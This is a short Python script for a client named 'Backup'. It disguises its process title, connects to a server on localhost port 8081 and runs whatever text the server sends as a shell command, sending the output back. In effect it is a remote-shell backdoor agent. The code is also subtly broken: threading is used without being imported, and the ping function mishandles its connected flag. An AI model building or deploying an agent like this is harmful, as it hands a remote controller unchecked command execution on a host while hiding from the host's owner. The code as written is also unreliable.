import os 
import psutil
import socket
import subprocess
import setproctitle
from time import sleep

import config

setproctitle.setproctitle(config.backup_name)

HOST = "127.0.0.1"
PORT = 8081

s = socket.socket()

connected = False

def ping():
    print("[Backup] started backup ping thread")
    while True and connected:
        try:
            s.send("ping".encode())
            sleep(config.ping_time)
        except BrokenPipeError:
            print("[Backup] Disconnected from Server: Server Offline")
            connected = False

def main():
    global connected
    while True:
        while (connected == False):
            try:
                s.connect((HOST,PORT))
                print("[Backup] Successfully Connected to Server")
                connected = True
            except ConnectionRefusedError:
                print("[Backup] Connection failed, retrying")
                sleep(config.connection_failed_time)
        while (connected == True):
            data = s.recv(1024).decode()
            if (data != ""):
                print("[Backup] Server: " + data)
                try:
                    result = subprocess.check_output(
                        data,
                        stderr=subprocess.STDOUT,
                        shell=True,
                        text=True,
                        universal_newlines=True
                    )
                except subprocess.CalledProcessError as exc:
                    s.send(exc.output.encode())
                else:
                    if (result == None or result == ""):
                        s.send("Success".encode())
                    else:
                        s.send(result.encode())

if __name__ == "__main__":
    ping_thread = threading.Thread(target=ping)
    ping_thread.start()

    main()
